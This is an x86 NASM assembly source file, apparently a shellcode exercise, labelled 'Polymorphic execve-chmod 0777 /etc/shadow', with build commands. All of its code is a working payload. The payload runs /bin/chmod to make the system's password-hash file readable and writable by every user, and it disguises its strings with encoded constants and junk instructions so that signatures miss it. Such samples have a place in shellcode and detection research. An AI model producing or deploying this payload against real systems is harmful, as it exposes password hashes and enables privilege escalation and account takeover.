; Polymorphic  execve-chmod 0777 /etc/shadow
; Author Liviu I. 
;
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE

; 
; $ nasm -f elf32 -o chmod.o chmod.nasm
; $ ld -z execstack -o chmod chmod.o
;
global _start			

section .text
_start:
    xor eax,eax
    push eax
    push dword 0x776f6461
    mov esi, 0x56611d1d         ; push dword 0x68732f2f
    lea edi, [esi]              ; junk
    add esi, 0x12121212
    push esi
    push dword 0x6374652f       ; '/etc/shadow'
    mov esi,esp
    push eax
    push dword 0x37373730       ; 0777
    mov ebp,esp
    push eax
    push dword 0x646f6d68
    mov edi, 0x030f0e09         ; push dword 0x632f6e69       
    add edi, 0x60206060
    push edi
    push word 0x622f            ; /bin/chmod
    mov ebx,esp
    push eax
    push esi
    push ebp
    push ebx
    mov ecx,esp
    mov edx,eax
    xor eax, eax                ; mov al,0xb
    add al, 0xa
    add al, 0x1
    xchg ecx, ecx               ; NOP added
    int 0x80

